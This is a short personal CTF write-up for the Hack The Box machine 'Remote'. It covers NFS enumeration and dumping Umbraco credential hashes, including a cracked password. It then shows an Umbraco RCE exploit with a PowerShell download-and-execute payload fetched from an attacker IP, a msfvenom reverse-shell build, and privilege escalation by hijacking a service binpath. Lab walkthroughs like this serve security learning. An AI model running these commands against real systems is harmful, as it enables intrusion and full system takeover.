<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.180 Remote</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.180 Remote</h1><br/>nmap showed me that many ports were open.<br />smb anonymous was able to connect but there was nothing interesting to find<br />with web I could see tons of dirs and a login page but I was not able to brute force it.<br />nmap did show that nfs was open,<br />    showmound -e 10.10.10.180 showed me that /site_backups was available to me!<br />    mount -t nfs  10.10.10.180:/site_backups /mnt/<br /><br />once mounted I used the github tool HawkEye made by Ice3man543 to find files of interest.<br />/Yeet/Machines/HTB/Remote/hawkeye/hawkeye -d /mnt/<br /> It showed displayed that there was a file in App_Data named Umbraco.sdf that would be interesting<br />sdf files are a kind of sql database file that I couldn&#39;t figure out how to mount to anything.<br />turns out cat and more worked just fine!!<br /><br />Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d<br />adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50<br />adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f<br />smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e<br />ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749<br /><br />this was the actual hash<br />b8be16afba8c314ad33d812f22a04991b90e2aaa    baconandcheese<br /><br />with this I was able to login as admin to the website!<br />As previoulsy stated the machine is running Umbraco 7 which searchsploit says is vulnerable<br />there is an exploit for it on kali (46153.py) but I find it easier to go to github and find someone who allready crafted it to take input (Umbraco-RCE).<br /><br />nc -nlvp 3232<br />/Yeet/Machines/HTB/Remote/Umbraco-RCE# python3.8 exploit.py -u admin@htb.local -p baconandcheese -i &#39;http://10.10.10.180&#39; -c powershell.exe -a &quot;-NoProfile -Command IEX(new-object net.webclient).downloadstring(&#39;http://10.10.14.60:8000/3232.ps1&#39;)&quot;<br /><br />user shell and user.txt!!<br /><br /><br />msfvenom -p windows/shell_reverse_tcp lhost =10.10.14.60 lport=3233 -f exe --platform windows &gt; 3233.exe<br />I cheated to find that i could edit a service running as nt authority\system &gt;&gt;&gt;&gt;&gt;&gt; PowerUp.ps1 would have done the trick<br />wmic service where started=true get name,startname      &lt;not important, but a cool new way to show process<br />sc.exe  status UsoSvc   (not sc, that is something else in powershell)<br />sc.exe stop UsoSvc<br />sc.exe config UsoSvc binpath=&quot;C:\users\public\3233.exe&quot;<br />start nc listener<br />sc.exe start UsoSvc<br /><br />...<br />rooted!!</div></body></html>